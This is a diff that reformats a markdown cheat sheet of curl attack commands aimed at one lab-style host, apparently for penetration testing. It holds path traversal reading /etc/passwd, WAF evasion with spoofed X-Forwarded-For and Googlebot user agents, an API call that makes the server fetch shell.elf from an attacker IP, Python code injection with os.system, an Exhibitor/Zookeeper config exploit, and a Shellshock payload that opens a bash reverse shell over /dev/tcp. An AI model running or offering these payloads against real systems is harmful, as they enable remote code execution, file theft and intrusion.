@@ -1,4 +1,5 @@
-Basics 
+# Basics 
+```bash
 curl -i 192.168.200.5
 curl -iL 192.168.200.5
 curl 192.168.200.5/robots.txt -s | html2text
@@ -7,15 +8,19 @@ curl 192.168.200.5 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
 curl http://192.168.200.5/logs?file=/etc/passwd
 curl -i http://192.168.200.5/cgi-bin/admin.cgi -s | html2text
 curl -i http://192.168.200.5/cgi-bin/test.cgi -s > test.cgi.txt
+```
 
-WAF Dodge
+# WAF Dodge
+```bash
 curl http://192.168.200.5/logs --header "X-Forwarded-For: 127.0.0.1"
 curl -A "GoogleBot" 192.168.200.5/robots.txt
 curl -A 'Googlebot/2.1 (+http://www.google.com/bot.html)' https://192.168.200.5/bad.txt
 curl -H 'User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)' http://192.168.200.5/robots.txt
 curl --user-agent libwww-perl/6.08 http://192.168.200.5/robots.txt
+```
 
-API
+# API
+```bash
 curl http://192.168.200.5/nodes
 curl http://192.168.200.5/nodes -d ""
 curl -X POST http://192.168.200.5/nodes
@@ -23,17 +28,22 @@ curl -s -i -X POST -H 'Content-Length: 0' http://192.168.200.5/weird
 curl http://192.168.200.5/update --header "X-Forwarded-For: 127.0.0.1" -X POST
 curl http://192.168.200.5/update --header "X-Forwarded-For: 127.0.0.1" -X POST -H 'Content-Type: application/json' -d '{"user":"bobadmin", "url":"http://192.168.119.154:22/shell.elf"}
 curl http://192.168.200.5/restart --header "X-Forwarded-For: 127.0.0.1" -X POST -H 'Content-Type: application/json' -d '{"confirm":"true"}
+```
 
-API Execution
+# API Execution
+```bash
 curl http://192.168.200.5/verify
 curl http://192.168.200.5/verify -d "code=2*9"
 curl http://192.168.200.5/verify -d "code=os"
 curl http://192.168.200.5/verify -d "code=os.system('whoami')
+```
 
-Datafile for Exploit (Zookeeper)
+# Datafile for Exploit (Zookeeper)
+```bash
 vim data.json   ..{ "zookeeperInstallDirectory": "/opt/zookeeper", "Data": "/zookeeper/data",...}
 curl -X POST -d @data.json http://192.168.200.5:8080/exhibitor/v1/config/set 
 {"message":"OK","succeeded":true}   
+```
 
-Shellshock
-curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.154/PORT 0>&1' http://192.168.200.5/bad.txt
+# Shellshock
+- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.154/PORT 0>&1' http://192.168.200.5/bad.txt`
